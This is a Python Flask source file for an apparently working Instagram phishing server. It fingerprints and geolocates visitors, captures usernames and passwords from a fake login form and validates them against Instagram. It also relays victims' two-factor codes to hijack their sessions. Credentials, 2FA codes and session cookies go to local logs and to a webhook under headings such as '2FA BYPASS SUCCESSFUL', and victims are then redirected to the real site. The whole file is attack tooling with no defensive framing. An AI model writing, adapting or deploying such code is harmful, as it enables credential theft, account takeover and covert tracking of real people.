import pytz
import datetime
import time
import logging
import requests
import json
import re
from flask import Flask, render_template, request, redirect
from app.instagram_api import IsExists, two_factor
from app.functions import (edit_cookies, first_art, correct_all, wrong_answer, 
                          twoFA_active, twoFA_correct, send_webhook_message,
                          advanced_ip_info, device_fingerprint, browser_analysis,
                          platform_detection, show_complete_data)
from colorama import Fore, Style
import concurrent.futures

app = Flask(__name__)

username = None
password = None
user_agent = None
two_factor_identifier = None
method = None
params = None
collected_data = {}

def get_client_ip():
    """Get real client IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    elif request.headers.get('CF-Connecting-IP'):  # Cloudflare
        return request.headers.get('CF-Connecting-IP')
    else:
        return request.remote_addr

def collect_advanced_data():
    """Collect all advanced user data"""
    global collected_data
    
    # Basic request data
    user_ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', '')
    
    # Collect all headers
    headers_data = dict(request.headers)
    
    # Get timestamp
    indian_tz = pytz.timezone('Asia/Kolkata')
    utc_now = datetime.datetime.now(datetime.timezone.utc)
    indian_time = utc_now.astimezone(indian_tz)
    visit_time = indian_time.strftime("%Y-%m-%d %I:%M:%S %p")
    
    collected_data = {
        'timestamp': visit_time,
        'ip_address': user_ip,
        'user_agent': user_agent,
        'headers': headers_data,
        'referrer': request.headers.get('Referer', 'Direct'),
        'accept_language': request.headers.get('Accept-Language', ''),
        'accept_encoding': request.headers.get('Accept-Encoding', ''),
        'connection': request.headers.get('Connection', ''),
        'dnt': request.headers.get('DNT', ''),
        'sec_fetch_site': request.headers.get('Sec-Fetch-Site', ''),
        'sec_fetch_mode': request.headers.get('Sec-Fetch-Mode', ''),
    }
    
    # Get advanced IP information
    ip_info = advanced_ip_info(user_ip)
    collected_data.update({'ip_info': ip_info})
    
    # Analyze browser and device
    device_info = device_fingerprint(user_agent)
    browser_info = browser_analysis(user_agent, headers_data)
    platform_info = platform_detection(user_agent, headers_data)
    
    collected_data.update({
        'device_info': device_info,
        'browser_info': browser_info,
        'platform_info': platform_info
    })
    
    return collected_data

@app.route('/')
def index():
    global user_agent, params, collected_data
    
    # Collect all advanced data
    collected_data = collect_advanced_data()
    
    # Show beautiful terminal output
    first_art(collected_data)
    
    # Log to file
    with open('output/advanced_visitor_log.json', 'a') as f:
        f.write(json.dumps(collected_data, indent=2) + '\n')
    
    with open('output/ip_agent.log', 'a') as f:
        f.write(f"\n\n=== NEW VISITOR ===\n")
        f.write(f"Time: {collected_data['timestamp']}\n")
        f.write(f"IP: {collected_data['ip_address']}\n")
        f.write(f"Location: {collected_data['ip_info'].get('city', 'Unknown')}, {collected_data['ip_info'].get('country', 'Unknown')}\n")
        f.write(f"ISP: {collected_data['ip_info'].get('isp', 'Unknown')}\n")
        f.write(f"Device: {collected_data['device_info']['device_type']}\n")
        f.write(f"OS: {collected_data['device_info']['os']}\n")
        f.write(f"Browser: {collected_data['browser_info']['browser']} {collected_data['browser_info']['version']}\n")
        f.write(f"Platform: {collected_data['platform_info']['source_platform']}\n")
        f.write(f"User-Agent: {collected_data['user_agent']}\n")
    
    params = {"display_type": "none"}
    return render_template('index.html', params=params)

@app.route('/submit', methods=['POST'])
def submit():
    global username, password, user_agent, two_factor_identifier, method, params, collected_data
    
    username = request.form['username']
    password = request.form['password']
    user_agent = request.headers.get('User-Agent')
    
    # Add credentials to collected data
    collected_data.update({
        'username': username,
        'password': password,
        'credentials_timestamp': datetime.datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %I:%M:%S %p")
    })
    
    result, cookies = IsExists(username, password, user_agent)

    if result and result.get("status") == "ok" and result.get("authenticated") is not None and result.get("authenticated"):
        cookies = edit_cookies(cookies)
        collected_data['cookies'] = cookies
        collected_data['login_status'] = 'SUCCESS'
        
        # Show complete success data
        show_complete_data(collected_data, 'SUCCESS')
        correct_all(username, password, cookies)
        
        with open('output/correct_pass_user.log', 'a') as f:
            f.write(f"\n=== SUCCESSFUL LOGIN ===\n")
            f.write(f"Username: {username}\nPassword: {password}\n")
            f.write(f"IP: {collected_data['ip_address']}\n")
            f.write(f"Location: {collected_data['ip_info'].get('city', 'Unknown')}, {collected_data['ip_info'].get('country', 'Unknown')}\n")
            f.write(f"Device: {collected_data['device_info']['device_type']} - {collected_data['device_info']['os']}\n")
            f.write(f"Browser: {collected_data['browser_info']['browser']} {collected_data['browser_info']['version']}\n")
            f.write(f"Platform: {collected_data['platform_info']['source_platform']}\n")
            f.write(f"Cookies: {cookies}\n")
            f.write(f"Timestamp: {collected_data['credentials_timestamp']}\n")
        
        # Enhanced webhook message
        webhook_message = f"""🎯 SUCCESSFUL INSTAGRAM LOGIN 🎯

👤 CREDENTIALS:
Username: {username}
Password: {password}

🌍 LOCATION DATA:
IP Address: {collected_data['ip_address']}
Country: {collected_data['ip_info'].get('country', 'Unknown')}
City: {collected_data['ip_info'].get('city', 'Unknown')}
ISP: {collected_data['ip_info'].get('isp', 'Unknown')}
Timezone: {collected_data['ip_info'].get('timezone', 'Unknown')}

📱 DEVICE INFO:
Device: {collected_data['device_info']['device_type']}
OS: {collected_data['device_info']['os']}
Browser: {collected_data['browser_info']['browser']} {collected_data['browser_info']['version']}

🔗 PLATFORM:
Source: {collected_data['platform_info']['source_platform']}
Referrer: {collected_data['referrer']}

🍪 SESSION:
{cookies}

⏰ Time: {collected_data['credentials_timestamp']}"""

        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(send_webhook_message, webhook_message)
            result = future.result()

        return redirect("https://www.instagram.com")

    elif result.get("two_factor_required"):
        two_factor_identifier = result.get("two_factor_info", {}).get("two_factor_identifier")
        collected_data['login_status'] = '2FA_REQUIRED'
        collected_data['2fa_method'] = 'Unknown'
        
        if result.get("two_factor_info", {}).get("sms_two_factor_on"):
            phone_number = result.get("two_factor_info", {}).get("obfuscated_phone_number")
            method = 1
            collected_data['2fa_method'] = f'SMS to {phone_number}'
            params = {
                "method_message": f"Enter the code we sent to your number ending in {phone_number}.",
                "backup_message": "If you're unable to receive a security code, use one of your",
                "display_type": "none"
            }
        elif result.get("two_factor_info", {}).get("whatsapp_two_factor_on"):
            method = 2
            collected_data['2fa_method'] = 'WhatsApp'
            params = {
                "method_message": "Enter a login code generated by a whatsapp.",
                "backup_message": "If you're unable to receive a security code, use one of your",
                "display_type": "none"
            }
        elif result.get("two_factor_info", {}).get("totp_two_factor_on"):
            method = 3
            collected_data['2fa_method'] = 'TOTP App'
            params = {
                "method_message": "Enter a 6-digit login code generated by an authentication app.",
                "backup_message": "If you're unable to receive a login code from an authentication app, you can use one of your",
                "display_type": "none"
            }

        # Show 2FA data
        show_complete_data(collected_data, '2FA_REQUIRED')
        
        with open('output/correct_pass_user.log', 'a') as f:
            f.write(f"\n=== 2FA REQUIRED ===\n")
            f.write(f"Username: {username}\nPassword: {password}\n")
            f.write(f"2FA Method: {collected_data['2fa_method']}\n")
            f.write(f"IP: {collected_data['ip_address']}\n")
            f.write(f"Location: {collected_data['ip_info'].get('city', 'Unknown')}, {collected_data['ip_info'].get('country', 'Unknown')}\n")
            f.write(f"Device: {collected_data['device_info']['device_type']} - {collected_data['device_info']['os']}\n")
            f.write(f"Timestamp: {collected_data['credentials_timestamp']}\n")
        
        twoFA_active(username, password)
        return redirect("/twoFA")
   
    else:  # ERROR 
        collected_data['login_status'] = 'FAILED'
        show_complete_data(collected_data, 'FAILED')
        wrong_answer(username, password)
        
        with open('output/wrong_pass.log', 'a') as f:
            f.write(f"\n=== FAILED LOGIN ATTEMPT ===\n")
            f.write(f"Username: {username}\nPassword: {password}\n")
            f.write(f"IP: {collected_data['ip_address']}\n")
            f.write(f"Location: {collected_data['ip_info'].get('city', 'Unknown')}, {collected_data['ip_info'].get('country', 'Unknown')}\n")
            f.write(f"Device: {collected_data['device_info']['device_type']} - {collected_data['device_info']['os']}\n")
            f.write(f"Timestamp: {collected_data['credentials_timestamp']}\n")
        
        params = {"display_type": "block"}
        return render_template('/index.html', params=params)

@app.route('/twoFA', methods=['GET', 'POST'])
def twoFA():
    global username, password, user_agent, two_factor_identifier, method, params, collected_data

    if request.method == 'POST':
        code = request.form['code']
        collected_data['2fa_code'] = code
        collected_data['2fa_timestamp'] = datetime.datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %I:%M:%S %p")
        
        result, cookies = two_factor(code, two_factor_identifier, username, user_agent, method)
        
        if result.get("authenticated") is not None and result.get("authenticated"):
            cookies = edit_cookies(cookies)
            collected_data['cookies'] = cookies
            collected_data['login_status'] = '2FA_SUCCESS'
            
            # Show complete 2FA success data
            show_complete_data(collected_data, '2FA_SUCCESS')
            
            # Enhanced webhook message for 2FA success
            webhook_message = f"""🎯 2FA BYPASS SUCCESSFUL 🎯

👤 CREDENTIALS:
Username: {username}
Password: {password}
2FA Code: {code}
2FA Method: {collected_data['2fa_method']}

🌍 LOCATION DATA:
IP Address: {collected_data['ip_address']}
Country: {collected_data['ip_info'].get('country', 'Unknown')}
City: {collected_data['ip_info'].get('city', 'Unknown')}
ISP: {collected_data['ip_info'].get('isp', 'Unknown')}

📱 DEVICE INFO:
Device: {collected_data['device_info']['device_type']}
OS: {collected_data['device_info']['os']}
Browser: {collected_data['browser_info']['browser']} {collected_data['browser_info']['version']}

🍪 SESSION:
{cookies}

⏰ Time: {collected_data['2fa_timestamp']}"""
            
            twoFA_correct(cookies)
            with open('output/correct_pass_user.log', 'a') as f:
                f.write(f"\n=== 2FA SUCCESS ===\n")
                f.write(f"2FA Code: {code}\n")
                f.write(f"Cookies: {cookies}\n")
                f.write(f"2FA Timestamp: {collected_data['2fa_timestamp']}\n")
            
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.submit(send_webhook_message, webhook_message)
        else:
            collected_data['login_status'] = '2FA_FAILED'
            params.update({"display_type": "block"})
            return render_template('/twoFA.html', params=params)
    
    else:
        params.update({"display_type": "none"})
        return render_template('twoFA.html', params=params)

    return redirect("https://www.instagram.com")

if __name__ == '__main__':
    try:
        log = logging.getLogger('werkzeug')
        log.disabled = True
        logging.disable(logging.CRITICAL)
        host = '0.0.0.0'
        port = 8080
        app.run(host=host, port=port)
    except:
        print(Fore.RED + "EXIT" + Style.RESET_ALL)
